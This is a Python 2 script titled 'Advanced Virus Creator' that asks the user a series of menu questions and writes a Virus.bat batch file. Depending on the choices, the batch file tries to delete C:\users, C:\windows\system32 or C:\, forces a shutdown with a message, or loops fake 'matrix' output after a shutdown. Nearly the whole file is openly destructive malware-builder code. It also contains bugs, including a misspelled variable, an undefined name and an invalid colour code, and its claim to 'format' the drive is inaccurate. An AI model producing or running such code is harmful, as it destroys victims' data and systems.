import os
import time
print "                AAA    VVVVVVVV           VVVVVVVV       CCCCCCCCCCCCC"
print "               A:::A   V::::::V           V::::::V    CCC::::::::::::C"
print "              A:::::A  V::::::V           V::::::V  CC:::::::::::::::C"
print "             A:::::::A V::::::V           V::::::V C:::::CCCCCCCC::::C"
print "            A:::::::::A V:::::V           V:::::V C:::::C       CCCCCC"
print "           A:::::A:::::A V:::::V         V:::::V C:::::C              "
print "          A:::::A A:::::A V:::::V       V:::::V  C:::::C              "
print "         A:::::A   A:::::A V:::::V     V:::::V   C:::::C              "
print "        A:::::A     A:::::A V:::::V   V:::::V    C:::::C              "
print "       A:::::AAAAAAAAA:::::A V:::::V V:::::V     C:::::C              "
print "      A:::::::::::::::::::::A V:::::V:::::V      C:::::C              "
print "     A:::::AAAAAAAAAAAAA:::::A V:::::::::V        C:::::C       CCCCCC"
print "    A:::::A             A:::::A V:::::::V          C:::::CCCCCCCC::::C"
print "   A:::::A               A:::::A V:::::V            CC:::::::::::::::C"
print "  A:::::A                 A:::::A V:::V               CCC::::::::::::C"
print "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+"
print "+ ADVANCED                        VIRUS                CREATOR        +"
print "+Version 2.0                                                          +"
print "+          By El Sonador                                              +"
print "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+"
#message=1 means virus with message
#message=2 means virus without message
def D_create_virus(parameter,message,text,color):
    if parameter == 1:
        if message == 1:
            D_Virus = open("Virus.bat", "wb")
            D_Virus.write("@echo off" + os.linesep + "color " +color + os.linesep + "echo " + text + os.linesep + "timeout /t 5" + os.linesep + "del C:\users ");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5) 
        if message == 2:
            D_Virus = open("Virus.bat", "wb")
            D_Virus.write("@echo off" + os.linesep + "color " +color + os.linesep + "del C:\users ");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5) 
    if parameter == 2:
        if message == 1:
            D_Virus = open("Virus.bat", "wb")
            D_Virus.write("@echo off" + os.linesep + "color" + color + os.linesep + "echo " + text + os.linesep + "timeout /t 5" + os.linesep + "del C:\windows\system32 ");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5) 
        if message ==2:
            D_Virus = open("Virus.bat", "wb")
            D_Virus.write("@echo off" + os.linesep + "color "+color + os.linesep + "del C:\windows\system32 ");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5) 
    if parameter == 3:
        if messge == 1:
            D_Virus = open("Virus.bat", "wb")
            D_Virus.write("@echo off" + os.linesep + "color" + color + os.linesep + "echo " + text + os.linesep + "timeout /t 5" + os.linesep + "del C:\ ");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5) 
        if message == 2:
            D_Virus = open("Virus.bat", "wb")
            D_Virus.write("@echo off" + os.linesep + "color "+ color + os.linesep + "del C:\ ");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5) 
def I_create_virus(parameter,message,text):
    if parameter ==1:
        I_Virus = open("Virus.bat", "wb")
        I_Virus.write("shutdown -s -t 5 -c  " + text)
        I_Virus.close()
        print "Successfully built.Press enter for exit"
        time.sleep(5)
def M_create_virus(color):
        M_Virus = open("Virus.bat", "wb")
        M_Virus.write("@echo off" + os.linesep + "color " + color + os.linesep + "shutdown /t 5 " + os.linesep + ":loop" + os.linesep + "echo 01001010100100101" + os.linesep + "echo 01010010101010101010010101010110" + os.linesep + "echo 010101001010" + os.linesep + " goto loop" )
        M_Virus.close()
        print "Successfully built.Press enter for exit"
        time.sleep(5) 
print "+-----Options--------------------------->"
print "What kind of virus you going to create? >"
print "+--------------------------------------->"
print "1)Destructive virus                     >"
print "2)Intimidating virus                    >"
print "+--------------------------------------->"
kind = input("What is your choice?? ~ ")
if kind == 1:
    print "+----------------------------+"
    print "1)Del all documents          +"
    print "2)Del system32               +"
    print "3)Format hard drive {C:\}    +"
    print "+----------------------------+"
    chvalue = input ("What is your choice?? ~ ")
    if chvalue == 1:
        print "+--------------------------------------+"
        print "Do you want any messages in virus??  +"
        print "1)Yes                                  +"
        print "2)No                                   +"
        print "+--------------------------------------+"
        choicevalue2 = input ("What is your choice?? ~ ")
        print "+------------------------------------------------------+"
        print "What color do you want to have the font??              +"
        print "+------------------------------------------------------+"
        print "Colors                      +"
        print "+---------------------------+"
        print "1)Red                       +"
        print "2)Blue                      +"
        print "3)Green                     +"
        print "+---------------------------+"
        choicevalue3 = input ("What is your choice?? ~ ")
        if choicevalue2 == 1:
            if choicevalue3 == 1:
                text = raw_input ("Enter your message")
                D_create_virus(1,1,text,"0C")
            if choicevalue3 == 2:
                text2 = raw_input("Enter your message")
                D_create_virus(1,1,text2,"09")
            if choicevalue3 == 3:
                text3 = raw_input("Enter yout message")
                D_create_virus(1,1,text3,"0A")
        if choicevalue2 == 2:
            if choicevalue3 == 1:
                D_create_virus(1,2,"","0C")
            if choicevalue3 == 2:
                D_create_virus(1,2,"","09")
            if choicevalue3 == 3:
                D_create_virus(1,2,"","0A")
#--------------------------------------------------------------
    if chvalue == 2:
        print "+--------------------------------------+"
        print "Do you want any messages in virus??  +"
        print "1)Yes                                  +"
        print "2)No                                   +"
        print "+--------------------------------------+"
        choicevalue4 = input("What is your choice ~ ")
        print "+------------------------------------------------------+"
        print "What color do you want to have the font??              +"
        print "+------------------------------------------------------+"
        print "Colors                      +"
        print "+---------------------------+"
        print "1)Red                       +"
        print "2)Blue                      +"
        print "3)Green                     +"
        print "+---------------------------+"
        choicevalue5 = input("What is your choice?? ~ ")
#---------------------------CREATE WITH MESSAGE---------------------------------------
        if choicevalue4 == 1:
            if choicevalue5 == 1:
                text4 = raw_input ("Enter your Message")
                D_create_virus(2,1,text4,"0C")
            if choicevalue5 == 2:
                text5 = raw_input("Enter your message")
                D_create_virus(2,1,text5,"09")
            if choicevalue5 == 3:
                text6 = raw_input("Enter your message")
                D_create_virus(2,1,text6,"0A")
#----------------------------------NO MESSAGE CREATE------------------------------------
        if choicevalue4 == 2:
            if choicevalue5 == 1:
                D_create_virus(2,2,"","0C")
            if choicevalue5 == 2:
                D_create_virus(2,2,"","09")
            if choicevalue5 == 3:
                D_create_virus(2,2,"","0A")
    if chvalue == 3:
        print "+----------------------------------------------+"
        print "This is the most Dangerous virus....Be careful +"
        print "+----------------------------------------------+"
        print "Do you want message in virus??       +"
        print "1)Yes                                +"
        print "2)No                                 +"
        print "+------------------------------------+"
        choicevalue5 = input("What is your choice?? ~ ")
        print "+------------------------------------------------------+"
        print "What color do you want to have the font??              +"
        print "+------------------------------------------------------+"
        print "Colors                      +"
        print "+---------------------------+"
        print "1)Red                       +"
        print "2)Blue                      +"
        print "3)Green                     +"
        print "+---------------------------+"
        choicevalue6 = input ("What is your choice ?? ~ ")
        if choicevalue5 == 1:
            if choicevalue6 == 1:
                text7 = raw_input("Enter your message ~ ")
                D_create_virus(3,1,text7,"0C")
            if choicevalue6 == 2:
                text8 = raw_input("Enter your message ~ ")
                D_create_virus(3,1,text8,"09")
            if choicevalue6 == 3:
                text9 = raw_input("Enter your message ~ ")
                D_create_virus(3,1,text,"0A")
        if choicevalue5 == 2:        
            if choicevalue6 == 1:
                D_create_virus(3,2,"","0C")
            if choicevalue6 == 2:
                D_create_virus(3,2,"","09")
            if choicevalue6 == 3:
                D_create_virus(3,2,"","0A")
if kind == 2:
    print "+---------------------------------+"
    print "1)Message and shutdown only virus +"
    print "2)Matrix - like virus             +"
    print "+---------------------------------+"
    ch2value = input ("What is your choice?? ~")
    if ch2value == 1:
        text = raw_input("Enter the message  ~ ")
        I_create_virus(1,1,text)
    if ch2value == 2:
        print "+------------------------------------------------------+"
        print "What color do you want to have the font of the matrix??+"
        print "+------------------------------------------------------+"
        print "Colors                      +"
        print "+---------------------------+"
        print "1)Red                       +"
        print "2)Blue                      +"
        print "3)Green                     +"
        print "+---------------------------+"
        ch2value2 = input("What is your choice?? ~ ")
        if ch2value2 == 1:
            M_create_virus("OC")
        if ch2value2 == 2:
            M_create_virus("09")
        if ch2value2 == 3:
            M_create_virus("0A")

